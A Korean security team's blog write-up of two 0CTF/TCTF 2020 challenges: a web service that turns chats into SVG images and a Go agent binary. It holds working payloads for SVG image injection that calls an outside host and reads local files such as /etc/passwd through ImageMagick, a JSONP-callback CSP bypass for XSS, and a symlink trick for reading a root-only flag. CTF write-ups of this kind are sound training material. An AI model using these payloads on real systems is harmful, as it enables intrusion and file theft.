<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2 | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2" />
<meta name="author" content="jeong.su" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="라온화이트햇 핵심연구팀 최정수" />
<meta property="og:description" content="라온화이트햇 핵심연구팀 최정수" />
<link rel="canonical" href="http://202.182.127.225:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2" />
<meta property="og:url" content="http://202.182.127.225:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-06-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2","dateModified":"2020-06-01T00:00:00+00:00","datePublished":"2020-06-01T00:00:00+00:00","author":{"@type":"Person","name":"jeong.su"},"url":"http://202.182.127.225:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2","mainEntityOfPage":{"@type":"WebPage","@id":"http://202.182.127.225:4000/2020-06-01/0CTF-TCTF-2020-Wechat-Generator-Cloud-Computing-v2"},"description":"라온화이트햇 핵심연구팀 최정수","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://202.182.127.225:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">0CTF/TCTF 2020 - Wechat Generator, Cloud Computing v2</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>CTF</i></center></span>
         
      
         
      
         
            <span class="tag"><center><i>Web</i></center></span>
         
      
         
            <span class="tag"><center><i>Reversing</i></center></span>
         
      
   
   
   <ul>
  <li><a href="#0ctftctf-2020-quals">0CTF/TCTF 2020 Quals</a></li>
  <li><a href="#wechat-generator">Wechat Generator</a></li>
  <li><a href="#cloud-computing-v2">Cloud Computing v2</a></li>
</ul>
   
   <p>라온화이트햇 핵심연구팀 최정수</p>

<h2 id="0ctftctf-2020-quals">0CTF/TCTF 2020 Quals</h2>

<blockquote>
  <p>2020.06.27 11:00 ~ 2020.06.29 11:00 KST (48 Hour)</p>
</blockquote>

<h2 id="wechat-generator">Wechat Generator</h2>

<blockquote>
  <p>Web
261 Pts
32 solved</p>
</blockquote>

<p>Come and check my latest innovation! It’s normal to encounter some bugs and glitches since it is still in beta development.
<a href="http://pwnable.org:5000/">http://pwnable.org:5000/</a></p>

<p><img src="/assets/jeong61.png" alt="/assets/jeong61.png" /></p>

<p>Wechat Generator 문제의 컨셉은 입력한 내용을 바탕으로 Fake Wechat 이미지를 생성해주는 서비스입니다.</p>

<p>메인 페이지에서는 크게 <code class="highlighter-rouge">Preview</code>와 <code class="highlighter-rouge">Share</code> 기능이 존재합니다.</p>

<p><code class="highlighter-rouge">Preview</code> 기능의 경우 서버로 요청과 응답 패킷은 아래와 같습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://pwnable.org:5000/preview HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 122
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

data=[{"type":0,"message":"Love you!"},{"type":1,"message":"Me too!!!"}]
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 06:38:45 GMT
Connection: close
Content-Type: application/json
Content-Length: 95404

{"previewid":"94e38e87-3554-4c0a-91c4-e31febc9c344","data":"data:image/svg+xml;base64,(Base64 Encoded SVG data)"}
</code></pre></div></div>

<p>대화 내용(data)을 넣고 요청하면 응답으로 <code class="highlighter-rouge">previewid</code>와 <code class="highlighter-rouge">data</code>를 받을 수 있습니다. <code class="highlighter-rouge">data</code>는 Base64로 인코딩된 이미지이며 새로운 대화 내용을 화면에 출력시켜줍니다.</p>

<p><img src="/assets/jeong62.png" alt="/assets/jeong62.png" /></p>

<p><code class="highlighter-rouge">data</code>의 내용을 보면 <code class="highlighter-rouge">image/svg+xml</code>을 확인 할 수 있고 Base64로 인코딩된 이미지 파일을 디코딩을 하면  위와 같이 svg로 생성된 이미지인 것을 확인할 수 있습니다.</p>

<p>Wechat Generator는 이모티콘(이모지)도 지원을 합니다. 이모티콘을 사용했을때 패킷을 보면 아래와 같습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://pwnable.org:5000/preview HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 133
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

data=[{"type":0,"message":"Love you!"},{"type":1,"message":"Me too!!![smile]!!!"}]
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 06:59:56 GMT
Connection: close
Content-Type: application/json
Content-Length: 95676

{"previewid":"412cf8f6-e141-41e9-bc95-dec8a01bc55d","data":"data:image/svg+xml;base64,(Base64 Encoded SVG data)"}
</code></pre></div></div>

<p>Requests의 <code class="highlighter-rouge">data</code>의 이모지는 <code class="highlighter-rouge">[smile]</code> text 들어가며 Response의 <code class="highlighter-rouge">data</code>를 디코딩 하여 살펴보면 <code class="highlighter-rouge">&lt;image&gt;</code>로 치환되어 들어가는 것을 확인할 수 있습니다.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;g</span> <span class="na">transform=</span><span class="s">"translate(273 572)"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;text</span> <span class="na">font-family=</span><span class="s">"SimHei,SimHei"</span> <span class="na">font-size=</span><span class="s">"72"</span><span class="nt">&gt;</span>Me too!!!<span class="nt">&lt;/text&gt;&lt;image</span> <span class="na">x=</span><span class="s">"360"</span> <span class="na">y=</span><span class="s">"-60"</span> <span class="na">height=</span><span class="s">"100"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">xlink:href=</span><span class="s">"http://pwnable.org:5000/static/emoji/smile.png"</span> <span class="nt">/&gt;&lt;text</span> <span class="na">x=</span><span class="s">"460"</span> <span class="na">font-family=</span><span class="s">"SimHei,SimHei"</span> <span class="na">font-size=</span><span class="s">"72"</span><span class="nt">&gt;</span>!!!<span class="nt">&lt;/text&gt;</span>
<span class="nt">&lt;/g&gt;</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[smile] -&gt; &lt;/text&gt;&lt;image x="360" y="-60" height="100" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://pwnable.org:5000/static/emoji/smile.png" /&gt;&lt;text x="460" font-family="SimHei,SimHei" font-size="72"&gt;
</code></pre></div></div>

<p>따라서 아래와 같은 요청으로 이미지를 임의로 삽입할 수 있습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[{"type":0,"message":"[smile.png\"/&gt;&lt;image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"http://u1804.jeong.su:8888/\"/&gt;&lt;test x=\"]"}]
</code></pre></div></div>

<p>단, 요청은 <code class="highlighter-rouge">preview</code> 기능이 아닌 <code class="highlighter-rouge">Share</code> 기능을 사용할때 <code class="highlighter-rouge">ImageMagick</code>에 의해 랜더링됩니다.</p>

<p><code class="highlighter-rouge">Share</code> 기능은 <code class="highlighter-rouge">previewid</code>를 공유 URL로 만들어주는 기능입니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://pwnable.org:5000/share HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 46
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

previewid=f2bc983f-4ef5-4ade-89da-7e3ad321d626
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 07:47:27 GMT
Connection: close
Content-Type: application/json
Content-Length: 47

{"url": "http://pwnable.org:5000/share/tTVFUw"}
</code></pre></div></div>

<p>공유 URL을 접속하게 되면 <code class="highlighter-rouge">&lt;img class="shareimg" src="/image/tTVFUw/png" id="preview"/&gt;</code> 와 같이 이미지를 가져오며  <code class="highlighter-rouge">ImageMagick</code>에 의해 랜더링됩니다.</p>

<p>우리는 FLAG를 얻기 위해서 서버의 쉘을 획득하거나 파일을 읽을 수 있어야합니다.</p>

<p>이때 위에서 언급했던 이미지를 임의로 삽입 할 수 있는 취약점을 사용합니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[{"type":0,"message":"[smile.png\"/&gt;&lt;image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"http://u1804.jeong.su:8888/\"/&gt;&lt;test x=\"]"}]
</code></pre></div></div>

<p>여러가지 Scheme을 사용하여 LFI를 시도한 결과, 아래와 같은 입력 값을 사용하여 로컬 파일을 읽어 올 수 있었습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xlink:href="text:/etc/passwd"

[{"type":0,"message":"[smile.png\"/&gt;&lt;image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"text:/etc/passwd\"/&gt;&lt;test x=\"]"}]
</code></pre></div></div>

<p>소스코드는 <code class="highlighter-rouge">/app/app.py</code> 경로에서 획득할 수 있었고 아래와 같이 이미지로 확인할 수 있습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xlink:href="text:/app/app.py"

[{"type":0,"message":"[smile.png\"/&gt;&lt;image xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"text:/app/app.py\"/&gt;&lt;test x=\"]"}]
</code></pre></div></div>

<p><img src="/assets/jeong63.png" alt="/assets/jeong63.png" /></p>

<p><a href="http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws">http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</a></p>

<p>소스코드를 통해 Admin 기능의 URL을 발견할 수 있습니다.</p>

<p>접속을 하면 아래와 같은 메세지와 URL을 입력할 수 있는 Input Box가 나오게됩니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Submit URL that can alert(1) to admin.
He will give you whatever you want for reward :)
</code></pre></div></div>

<p>이제 문제가 XSS Challege, CSP Bypass Challege로 바뀌는 순간입니다.</p>

<p>사진을 보여주는 Share 기능을 살펴보면 뒤에 확장자가 존재하는 것을 확인 할 수 있습니다.</p>

<p><a href="http://pwnable.org:5000/image/RjtlqV/png">http://pwnable.org:5000/image/RjtlqV/png</a></p>

<p>png의 값을 임의로 변경했을때 <code class="highlighter-rouge">{"error": "Wrong extension"}</code> 라는 리턴이 출력되는 것을 확인 할 수 있습니다. 확장자가 틀렸다는 메세지가 발생하므로 여러가지 확장자를 시도해봅니다.</p>

<p>여러가지 이미지 포맷의 확장자는 물론, <code class="highlighter-rouge">abc</code>, <code class="highlighter-rouge">txt</code>, <code class="highlighter-rouge">pdf</code>등의 확장자로 <code class="highlighter-rouge">ImageMagick</code>이 변환시켜줍니다. <code class="highlighter-rouge">exe</code> 확장자의 경우는 <code class="highlighter-rouge">{"error": "Convert exception: u'exe' is unsupported format"}</code>와 같은 에러가 발생했습니다. (유저의 인풋이 그대로 출력되는 상황입니다.)</p>

<p>XSS를 트리거하는게 목적이기 때문에 스크립트를 실행 할 수 있는 <code class="highlighter-rouge">html</code> 확장자도 시도해봤지만 <code class="highlighter-rouge">{"error": "Wrong extension"}</code> 메세지가 발생했고 결국 <code class="highlighter-rouge">htm</code> 확장자를 통해 사용자가 입력한 값을 그대로 출력해줍니다. Wechat 이미지를 생성할 때 생각해보면 <code class="highlighter-rouge">&lt;image&gt;</code> 태그를 넣었던 것처럼 <code class="highlighter-rouge">&lt;script&gt;</code> 태그를 삽입해주는 방법으로 스크립트를 실행 할 수 있습니다.</p>

<p>여러 기능을 살펴보면서 CSP가 아래와 같이 특정 기능(서비스)에만 걸려있는 것을 확인할 수 있었습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://pwnable.org:5000/
http://pwnable.org:5000/share/tTVFUw
http://pwnable.org:5000/image/tTVFUw/png

Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'
</code></pre></div></div>

<p><code class="highlighter-rouge">default-src 'self'</code> 때문에 같은 도메인에 js 파일을 업로드하는 방법으로 CSP를 우회 할 수 있겠다라는 생각이 들었습니다. 하지만 주어진 웹 서비스는 파일을 업로드하는 기능이 없습니다. 기능을 사용하면서 아래와 같은 사실을 알게 되었습니다.</p>

<p><code class="highlighter-rouge">Share</code> 기능을 사용할 때 <code class="highlighter-rouge">previewid</code>로 존재하지 않는 값을 주게 되면 에러가 발생하게 됩니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://pwnable.org:5000/share HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Content-Length: 14
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://pwnable.org:5000
Referer: http://pwnable.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

previewid=abcd
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 08:28:06 GMT
Connection: close
Content-Type: application/json
Content-Length: 47

{"url": "http://pwnable.org:5000/share/PfLqNp"}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://pwnable.org:5000/image/PfLqNp/png HTTP/1.1
Host: pwnable.org:5000
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Server: gunicorn/19.10.0
Date: Tue, 30 Jun 2020 08:29:19 GMT
Connection: close
Content-Type: application/json
Content-Length: 124
Content-Security-Policy: img-src * data:; default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; object-src 'none'; base-uri 'self'

{"error": "Convert exception: unable to open image `previews/abcd': No such file or directory @ error/blob.c/OpenBlob/2874"}
</code></pre></div></div>

<p>따라서 <code class="highlighter-rouge">previewid</code>를 <code class="highlighter-rouge">"+alert(1)+"</code>로 하고 공유 기능을 사용함으로써 우리는 아래와 같은 JSON을 얻을 수 있습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"error": "Convert exception: unable to open image `previews/"+alert(1)+"': No such file or directory @ error/blob.c/OpenBlob/2874"}
</code></pre></div></div>

<p>위 JSON을 Javascript Console에서 사용하면 당연히 alert 메세지가 잘뜹니다. 하지만 script의 js 파일처럼 불러오게 되면 아래와 같은 에러가 발생합니다.</p>

<p><img src="/assets/jeong64.png" alt="/assets/jeong64.png" /></p>

<p>따라서 JSON 파일을 <script> 태그의 src로 바로 가져올 수 있는 방법을 검색하다보니 보통은 Callback Function을 통해 사용한다고 되어있습니다.</script></p>

<p>하지만 웹 서비스의 javascript를 전부 찾아보았지만 Callback 함수는 존재하지 않았고 반신반의 하며  아래와 같이 요청을 한 결과 callback 함수처럼 변환해주는 기능이 있는 것을 확인했습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://pwnable.org:5000/image/mZdWjn/png?callback=xxx

xxx={"error": "Convert exception: unable to open image `previews/"+alert(1)+"': No such file or directory @ error/blob.c/OpenBlob/2874"}
</code></pre></div></div>

<p>따라서 아래와 같은 스크립트 태그를 사용하여 CSP를 우회 할 수 있었습니다. 여기서 src 또한 공백으로 치환하기 때문에 srsrcc를 사용하여 우회했습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script srsrcc='/image/mZdWjn/png?callback=xxx'&gt;&lt;script&gt;
</code></pre></div></div>

<h3 id="alert을-실행했지만-flag-인증까지-한-시간이-더-소요된-이야기">alert을 실행했지만 FLAG 인증까지 한 시간이 더 소요된 이야기</h3>

<p>FLAG를 주는 시크릿 페이지에서 alert(1)이 실행되는 URL을 제출 했지만 FLAG를 받을 수 없었고 더 열심히 하라는 내용이 출력됐습니다. 문제를 찾을 수 없어서 계속 스크립트도 바꿔보고 콘솔창에 발생하는 모든 에러를 지울 수 있도록 해봤지만 해결이 되지 않아서 IRC에 접속했습니다.</p>

<p>다행히도 친절한 ADMIN이 FLAG를 주는 봇은 외부에서 접속이 되지 않으며 BASE URL이 다를 수 있다는 이야기를 해줬습니다.</p>

<p><code class="highlighter-rouge">&lt;script srsrcc='http://pwnable.org:5000/image/mZdWjn/png?callback=xxx'&gt;&lt;script&gt;</code></p>

<p>처음에는 위와 같이 BASE 서버 주소가 포함된 URL을 요청 했기 때문에 서버에서 alert(1)이 실행되지 않았기 때문에 한 시간이 넘는 시간이 이상한 삽질에 쓰이게 됐습니다. 다음부터는 꼭 인지해야할 것 같습니다^^</p>

<h2 id="cloud-computing-v2">Cloud Computing v2</h2>

<blockquote>
  <p>Misc (Web + Reversing)
275 Pts
18 solved</p>
</blockquote>

<p>Cloud Computing v2 문제는 Cloud Computing 문제와는 다르게 flag가 루트 권한에서만 읽을 수 있게 되어 있습니다. 따라서 flag를 읽을 수 있는 다른 서비스가 있을 것이라고 생각을 했습니다.</p>

<p>Cloud Computing의 문제에서 open_basedir을 우회하여 루트 폴더를 보면 이상한 agent라는 바이너리가 존재하는 것을 알 수 있습니다.</p>

<p>agent 바이너리는 Echo라는 go 언어의 웹 프레임워크를 사용하여 작성되어 있습니다.</p>

<p>go 언어를 IDA로 분석하기 위해서 IDAPython 스크립트를 사용했습니다.</p>

<p><a href="https://github.com/strazzere/golang_loader_assist">https://github.com/strazzere/golang_loader_assist</a></p>

<p>해당 스크립트의 최신 스크립트는 IDA Pro 7.4 이후 Python3 버전에서 동작하도록 만들어져있습니다.</p>

<p>따라서 IDA Pro 7.2를 사용하는 저는 이전 commit을 보고 과거 버전에서 동작하는 스크립트를 찾아 실행시켰습니다.</p>

<p>(<a href="https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py">https://raw.githubusercontent.com/strazzere/golang_loader_assist/fd6e598fd586b0fe07e66c0d309824d119a02630/golang_loader_assist.py</a>)</p>

<p>main_main 함수에서 <code class="highlighter-rouge">127.0.0.1:80</code>로 Echo 서버를 시작하는 것을 알 수 있으며 아래와 같이 라우팅 되는 것을 확인할 수 있습니다.</p>

<p><code class="highlighter-rouge">/init</code> ⇒ <code class="highlighter-rouge">main_init</code></p>

<p><code class="highlighter-rouge">/read</code> ⇒ <code class="highlighter-rouge">main_read</code></p>

<p><code class="highlighter-rouge">/scan</code> ⇒ <code class="highlighter-rouge">main_scan</code></p>

<p>3가지 End-Point는 모두 dir을 인자로 받으며 dir은 <code class="highlighter-rouge">^/var/www/html/sandbox/[0-9a-f]{40}/</code> 정규식 검사를 하게 됩니다.</p>

<p><code class="highlighter-rouge">main_init</code> 함수는 주어진 dir에 <code class="highlighter-rouge">{"ban": "flag"}</code> 내용의 <code class="highlighter-rouge">config.json</code> 파일을 생성해주는 역할을 합니다.</p>

<p><code class="highlighter-rouge">main_read</code> 함수는 주어진 dir에 <code class="highlighter-rouge">config.json</code> 파일을 읽어서 ban 내용을 확인하고 <code class="highlighter-rouge">target</code>인자로 넘어온 경로를 읽어주는 역할을 합니다. 읽은 내용은 Base64로 인코딩하여 출력해줍니다. 단 ban에 있는 내용중 한글자라도 일치하게 되면 파일을 읽어주지 않습니다.</p>

<p><code class="highlighter-rouge">main_scan</code> 함수는 주어진 dir에 있는 <code class="highlighter-rouge">*.php</code> 파일들의 내용을 초기화 해주는 역할을 합니다.</p>

<p>따라서 아래와 같은 과정을 통해서 flag를 읽을 수 있습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo file_get_contents("http://127.0.0.1/init?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/");

symlink("/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.json", "/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/config.php");

echo file_get_contents("http://127.0.0.1/scan?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/");

echo file_get_contents("http://127.0.0.1/read?dir=/var/www/html/sandbox/c1023633f127ad0f5da7fdbee0e99c764d2d2e9b/&amp;target=/flag");

successsuccessfile contents:ZmxhZ3tkYzZhNzNhZjA1MmM2MTM1YjRjNjM1NmE0YWFmMGI1OH0K //flag{dc6a73af052c6135b4c6356a4aaf0b58}
</code></pre></div></div>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
   <a href="/2020-06-01/0ctf-Chromium-RCE-SBX-WriteUp" class="left arrow">&#8592;</a>
  
  
   <a href="/2020-05-01/memory" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2020-10-13 11:20:23 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
